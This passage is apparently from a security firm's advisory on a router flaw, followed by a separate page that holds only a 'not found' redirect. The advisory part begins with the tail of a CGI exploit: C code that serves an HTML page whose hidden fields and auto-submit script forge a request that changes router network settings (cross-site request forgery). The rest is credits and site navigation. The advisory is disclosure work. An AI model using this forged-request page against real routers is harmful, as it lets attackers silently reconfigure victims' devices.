type=\"hidden\" name=\"rip_multicast\" value=\"1\">\n" 	 " <input type=\"hidden\" name=\"rip_version\" value=\"2\">\n" 	 " <input type=\"hidden\" name=\"select\" value=\"-1\">\n" 	 " <input type=\"hidden\" name=\"sysLANIPAddr1\" value=\"192\">\n" 	 " <input type=\"hidden\" name=\"sysLANIPAddr2\" value=\"168\">\n" 	 " <input type=\"hidden\" name=\"sysLANIPAddr3\" value=\"1\">\n" 	 " <input type=\"hidden\" name=\"sysLANIPAddr4\" value=\"254\">\n" 	 " <input type=\"hidden\" name=\"sysLANSubnetMask1\" value=\"255\">\n" 	 " <input type=\"hidden\" name=\"sysLANSubnetMask2\" value=\"255\">\n" 	 " <input type=\"hidden\" name=\"sysLANSubnetMask3\" value=\"255\">\n" 	 " <input type=\"hidden\" name=\"sysLANSubnetMask4\" value=\"0\">\n" 	 " <input type=\"hidden\" name=\"sysPoolFinishAddr4\" value=\"254\">\n" 	 " <input type=\"hidden\" name=\"sysPoolStartingAddr4\" value=\"2\">\n" 	 " <input type=\"hidden\" name=\"sysRIPVersion\" value=\"Disabled\">\n" 	 " <input type=\"hidden\" name=\"wan_ipaddr\" value=\"....\">\n" 	 " <input type=\"hidden\" name=\"wan_netmask\" value=\"255.255.255.0\">\n" 	 " <input type=\"hidden\" name=\"wan_proto\" value=\"dhcp\">\n"  	 "</form>\n" 	 "<script type=\"application/javascript\">\n" 	 " window.setTimeout(\"document.csrf.submit();\", 100);\n" 	 "</script>\n" 	 "</body>\n" 	 "</html>\n", id);    }     return 0; }  ``` |
| --- |

Figure 1. CGI script that returns up to four different pages: the initial attack page, and the three additional pages that submit the actual forged requests.

## References

* [Netgear-telnetenable on Google Code](http://code.google.com/p/netgear-telnetenable/)

## Credit

* Discovered By: Jacob Thompson â Security Analyst @ Independent Security Evaluators
* Exploited By: Jacob Thompson â Security Analyst @ Independent Security Evaluators

## Contact Information

* For more information on this particular Belkin hack, you can contact us at routers@www.ise.io
* Alternatively, for more general information on ISE, you can reach us using contact@www.ise.io

![...](../../../assets/img/brand-text.svg)

* [![...](../../../assets/img/icons/social/linkedin.svg)](https://www.linkedin.com/company/independent-security-evaluators)
* [![...](../../../assets/img/icons/social/facebook.svg)](https://facebook.com/ISE.infosec)
* [![...](../../../assets/img/icons/social/twitter.svg)](https://twitter.com/ISEsecurity)

###### [Contact Us](../../../contact/)

###### [Privacy Policy](../../../privacy-policy/)

###### About

* [Company Values](../../../about/values/)
* [Methodology](../../../about/methodology/)
* [Leadership](../../../about/leadership/)
* [News](../../../news/)
* [Careers](../../../careers/)

###### Services

* [Assessments](../../../services/vulnerability-assessments/)
* [Consulting](../../../services/security-consulting-services/)
* [IoT Village](https://www.iotvillage.org/)
[Training](../../../services/training/)

###### Research

* [Studies & Papers](../../../research/)
* [Talks](../../../talks/)
* [Blog](../../../blog/)
* [VRM/TPRM Articles](../../../start/blog/)

###### Stay up to date on the latest research and industry trends. Sign up for our newsletter



=== Content from www.ise.io_69be4449_20250125_193038.html ===


[![...](./assets/img/brand.svg)](./)

* [About](./about/values/)
  ###### About ISE

  [Company Values](./about/values/ "Integrity, Quality, Dedication, Education")
  [Methodology](./about/methodology/ "Learn how we deliver reports")
  [Leadership](./about/leadership/ "Independent Security Evaluators")
  [News](./news/ "Stay up to date")
  [Careers](./careers/ "Join our team")
* [Services](./services/vulnerability-assessments/)
  ###### Assessments

  [Vulnerability Assessments](./services/vulnerability-assessments/)
  [Application Security Assessments](./services/application-security-assessment/)
  [Cloud Security Assessments](./services/cloud-security-assessment/)
  [Penetration Testing](./services/penetration-testing/)
  [Network Penetration Testing](./services/network-penetration-testing/)
  [Vulnerability Scanning](./services/managed-vulnerability-scanning/)
  ###### Hacking Events

  [IoT Village](https://www.iotvillage.org/)

  ###### Consulting

  [Security Consulting](./services/security-consulting-services/)
  [Independent Verification & Validation](./services/independent-verification-and-validation/)
  [Secure Design Analysis](./services/secure-design-analysis/)
  [IT Consulting](./services/it-consulting-services/)
  ###### Training

  [Security Training](./services/training/)
  [Hackalong](https://offers.ise.io/ise-application-security-training-workshop)
* [Research](./research/)
  ###### Research

  [Papers & Studies](./research/ "Papers & Studies")
  [Talks](./talks/ "Talks")
  [Hackers Blog](./blog/ "Hackers Blog")
  [Industry Blog](https://blog.ise.io/blog "Industry Blog")
  [VRM/TPRM Articles](./start/blog/ "Join our team")
  [Podcast](./research/podcast/ "Join our team")

* [START - Vendor Risk Management](./start/)

[Ask an Expert](https://offers.ise.io/ask-an-expert)

# Sorry, we couldn't find that. Redirecting....

![...](./assets/img/brand-text.svg)

* [![...](./assets/img/icons/social/linkedin.svg)](https://www.linkedin.com/company/independent-security-evaluators)
* [![...](./assets/img/icons/social/facebook.svg)](https://facebook.com/ISE.infosec)
* [![...](./assets/img/icons/social/twitter.svg)](https://twitter.com/ISEsecurity)

###### [Contact Us](./contact/)

###### [Privacy Policy](./privacy-policy/)

###### About

* [Company Values](./about/values/)
* [Methodology](./about/methodology/)
* [Leadership](./about/leadership/)
* [News](./news/)
* [Careers](./careers/)

###### Services

* [Assessments](./services/vulnerability-assessments/)
* [Consulting](./services/security-consulting-services/)
* [IoT Village](https://www.iotvillage.org/)
[Training](./services/training/)

###### Research

* [Studies & Papers](./research/)
* [Talks](./talks/)
* [Blog](./blog/)
* [VRM/TPRM Articles](./start/blog/)

###### Stay up to date on the latest research and industry trends. Sign up for our newsletter


